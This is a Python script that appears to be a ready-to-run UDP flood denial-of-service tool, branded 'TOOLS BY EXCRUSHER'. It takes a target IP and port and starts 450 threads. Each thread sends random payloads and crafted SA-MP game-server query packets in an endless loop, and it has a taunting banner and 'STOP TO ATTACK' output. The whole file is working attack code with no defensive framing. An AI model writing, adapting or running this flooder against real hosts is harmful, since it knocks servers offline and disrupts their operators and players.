import socket, struct, codecs, sys, threading, random, time, os,
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip

Pacotes = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]


referers = [
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO',
     'Your_Server_Bypassed_By_SANZO'
     'Your_Server_Bypassed_By_SANZO']
     

os.system("clear")
print ("""
\033[36m


──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
─██████████████─████████──████████─██████████████─████████████████───██████──██████─██████████████─██████──██████─
─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───██░░██──██░░██─██░░░░░░░░░░██─██░░██──██░░██─
─██░░██████████─████░░██──██░░████─██░░██████████─██░░████████░░██───██░░██──██░░██─██░░██████████─██░░██──██░░██─
─██░░██───────────██░░░░██░░░░██───██░░██─────────██░░██────██░░██───██░░██──██░░██─██░░██─────────██░░██──██░░██─
─██░░██████████───████░░░░░░████───██░░██─────────██░░████████░░██───██░░██──██░░██─██░░██████████─██░░██████░░██─
─██░░░░░░░░░░██─────██░░░░░░██─────██░░██─────────██░░░░░░░░░░░░██───██░░██──██░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─
─██░░██████████───████░░░░░░████───██░░██─────────██░░██████░░████───██░░██──██░░██─██████████░░██─██░░██████░░██─
─██░░██───────────██░░░░██░░░░██───██░░██─────────██░░██──██░░██─────██░░██──██░░██─────────██░░██─██░░██──██░░██─
─██░░██████████─████░░██──██░░████─██░░██████████─██░░██──██░░██████─██░░██████░░██─██████████░░██─██░░██──██░░██─
─██░░░░░░░░░░██─██░░░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─
─██████████████─████████──████████─██████████████─██████──██████████─██████████████─██████████████─██████──██████─
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
""")


print ("\033[37m                       ║ ══════════════════════════════════ ║")
print ("\033[37m                       ║      \033[31m   TOOLS BY EXCRUSHER       \033[37m║")
print ("\033[37m                       ╚════════════════════════════════════╝")

class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bytes = random._urandom(666)
            pack = random._urandom(666)
            msg = Pacotes[random.randrange(0, 1)]
            sock.sendto(bytes, (ip, int(port)))
            sock.sendto(pack, (ip, int(port)))
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Pacotes[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Pacotes[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Pacotes[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Pacotes[7], (ip, int(port)))
            elif int(port) == 7785:
                sock.sendto(Pacotes[8], (ip, int(port)))                
  
if __name__ == '__main__':
    try:
        for x in range(450):
            mythread = MyThread()
            mythread.start()
            time.sleep(.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print ("╔════════════════════════════════════╗")
        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
        print ("╚════════════════════════════════════╝")
        print ('\n\n')
        print ('STOP TO ATTACK {}').format(orgip)
